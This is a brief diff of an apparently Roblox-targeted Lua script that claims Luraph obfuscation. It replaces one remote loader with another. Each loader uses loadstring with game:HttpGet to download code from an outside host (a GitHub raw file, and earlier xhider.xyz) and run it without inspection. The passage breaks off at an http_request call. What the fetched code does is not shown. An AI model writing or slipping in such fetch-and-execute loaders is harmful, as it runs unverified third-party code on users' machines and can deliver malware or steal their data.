@@ -1,7 +1,7 @@
 -- This file was protected using Luraph Obfuscator v14.7 [https://lura.ph/]
 spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/WhiteX1208/Scripts/refs/heads/main/CauTrom.luau"))()
-	loadstring(game:HttpGet("https://xhider.xyz/raw/Xhider/Bot2/bwhdyuy1gj.lua"))()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/fakekuri/idk/refs/heads/main/notify.lua"))()
 end)
 local a, b = pcall(function()
 	return http_request({
